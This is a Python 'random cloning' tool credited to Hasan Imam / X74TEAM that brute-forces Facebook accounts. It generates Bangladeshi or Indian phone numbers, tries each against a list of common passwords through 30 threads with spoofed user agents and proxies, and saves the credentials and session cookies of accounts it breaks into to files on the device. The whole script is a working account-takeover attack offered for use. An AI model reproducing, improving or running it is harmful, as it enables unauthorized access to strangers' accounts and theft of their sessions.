#CREATE BY : Hasan Imam
#WHATSAPP : +8801700909089
#GITHUB : https://github.com/X74TEAM/
#----------------------------------------------------------------------------------------------------------
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0
        
logo = ("""
  \x1b[1;92m╔╗╔╗\033[0;33m╔══╗\033[0;34m╔══╗\033[0;35m╔══╗\033[0;31m╔═╦╗ \033[0;36m╔══╗\033[0;37m╔═╦═╗\x1b[1;92m╔══╗\033[0;31m╔═╦═╗
  \x1b[1;92m║╚╝║\033[0;33m║╔╗║\033[0;34m║══╣\033[0;35m║╔╗║\033[0;31m║║║║ \033[0;36m╚║║╝\033[0;37m║║║║║\x1b[1;92m║╔╗║\033[0;31m║║║║║
  \x1b[1;92m║╔╗║\033[0;33m║╠╣║\033[0;34m╠══║\033[0;35m║╠╣║\033[0;31m║║║║ \033[0;36m╔║║╗\033[0;37m║║║║║\x1b[1;92m║╠╣║\033[0;31m║║║║║
  \x1b[1;92m╚╝╚╝\033[0;33m╚╝╚╝\033[0;34m╚══╝\033[0;35m╚╝╚╝\033[0;31m╚╩═╝ \033[0;36m╚══╝\033[0;37m╚╩═╩╝\x1b[1;92m╚╝╚╝\033[0;31m╚╩═╩╝\x1b[1;92m
┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
┃\033[1;31mDEVELOPER : \x1b[1;92mHASAN IMAM   ┃\x1b[1;96mTOOL : \x1b[1;92mBD/INDIA┃
┃\033[1;31mGITHUB    : \x1b[1;92mX74TEAM      ┃\x1b[1;96mVERSION : \033[1;37m1.0\x1b[1;92m  ┃
┣━━━━━━━━━━━━━━━━━━━━━━┳━━┻━━━━━━━━━━━━━━━┫
┃\033[1;34mFACEBOOK  : \x1b[1;92mHASAN IMAM┃\x1b[1;96mTYPE : \033[1;37m\x1b[41mFREE\x1b[0m \x1b[1;92mRANDOM┃
┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛\x1b[0m
""")
logo1 = ("""
  \x1b[1;92m╔╗╔╗\033[0;33m╔══╗\033[0;34m╔══╗\033[0;35m╔══╗\033[0;31m╔═╦╗ \033[0;36m╔══╗\033[0;37m╔═╦═╗\x1b[1;92m╔══╗\033[0;31m╔═╦═╗
  \x1b[1;92m║╚╝║\033[0;33m║╔╗║\033[0;34m║══╣\033[0;35m║╔╗║\033[0;31m║║║║ \033[0;36m╚║║╝\033[0;37m║║║║║\x1b[1;92m║╔╗║\033[0;31m║║║║║
  \x1b[1;92m║╔╗║\033[0;33m║╠╣║\033[0;34m╠══║\033[0;35m║╠╣║\033[0;31m║║║║ \033[0;36m╔║║╗\033[0;37m║║║║║\x1b[1;92m║╠╣║\033[0;31m║║║║║
  \x1b[1;92m╚╝╚╝\033[0;33m╚╝╚╝\033[0;34m╚══╝\033[0;35m╚╝╚╝\033[0;31m╚╩═╝ \033[0;36m╚══╝\033[0;37m╚╩═╩╝\x1b[1;92m╚╝╚╝\033[0;31m╚╩═╩╝\x1b[1;92m
┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓
┃\033[1;31mDEVELOPER : \x1b[1;92mHASAN IMAM   ┃\x1b[1;96mTOOL : \x1b[1;92mBD/INDIA┃
┃\033[1;31mGITHUB    : \x1b[1;92mX74TEAM      ┃\x1b[1;96mVERSION : \033[1;37m1.0\x1b[1;92m  ┃
┣━━━━━━━━━━━━━━━━━━━━━━┳━━┻━━━━━━━━━━━━━━━┫
┃\033[1;34mFACEBOOK  : \x1b[1;92mHASAN IMAM┃\x1b[1;96mTYPE : \033[1;37m\x1b[41mFREE\x1b[0m \x1b[1;92mRANDOM┃
┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛""")

def DEVHISx():
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def Main():
        os.system("clear")
        print(logo)
        print('\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print("\033[1;92m[1] BD RANDOM CLONING")
        print("\033[1;92m[2] INDIA RANDOM CLONING")
        print("\033[1;92m[3] JOIN FACEBOOK GROUP")
        print("\033[1;92m[4] FOLLOW ON FACEBOOK")
        print("\033[1;92m[0] EXIT PROGRAMMING")
        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        DEVHIS =input("\n[?] Choose : ")
        if DEVHIS in ["1","01","2"]:
            fuck()
        if DEVHIS in ["3","03"]:
            os.system('xdg-open https://www.facebook.com/group/')
        if DEVHIS in ["4","04"]:
        	os.system('xdg-open https://www.facebook.com/SHANTO.ID')
        if DEVHIS in [" 0", "00"]:
            exit()
        else:
            exit()
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('┏━[•] EXAMPLE CODE: 017, 018, 019, 016')
    code = input('┗━[+] CHOOSE CODE : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('┏━[•] EXAMPLE: 2000 3000 5000 10000 ')
    limit = int(input('┗━[+] CHOOSE : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        IP = requests.get('https://api.ipify.org').text
        print('┏━[•] Total IDs: \033[1;37m'+tl)
        print('\x1b[1;92m┣━[•] Your Code: \033[1;37m'+code)
        print('\x1b[1;92m┣━[•] YOUR IP ADDRESS: \033[1;37m'+IP)
        print('\x1b[1;92m┣━[•] Process has been started')
        print('┗━[•] Dont Use Airplane mode')
        print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        for love in user:
            uid = code+name+cod+love
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'i love you','iloveyou','102030','203040','304050','405060','506070','607080','708090','jannat','Jannat','nusrat','Nusrat','sadiya','Sadiya','sumaiya','Sumaiya','fariya','Fariya','jannatul','Jannatul','Mimmim','mimmim']
            yaari.submit(DEVHIS2,uid,pwx,tl)
    print('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print(' ┏━[•] Crack process has been completed')
    print(' ┣━[•] OK Ids saved in DEVHIS-OK.txt')
    print(' ┗━[•] CP Ids saved in DEVHIS-CP.txt')
    print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def DEVHIS2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write(f'\r\r\033[1;92m[FINDING]▶ [\033[1;37m%s/%s\033[0m\033[1;32m] [OK-%s] ~ [CP-%s] '%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.alpha.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; Mi A3 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36',}
            lo = session.post('https://mbasic.alpha.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\n\033[1;92m[\033[1;31mACTIVE\033[1;92m] {cid} • {ps} \n")
                open('/sdcard/DEVHIS-OK.txt', 'a').write( uid+' | '+ps+'\n'+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                open('/sdcard/DEVHIS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
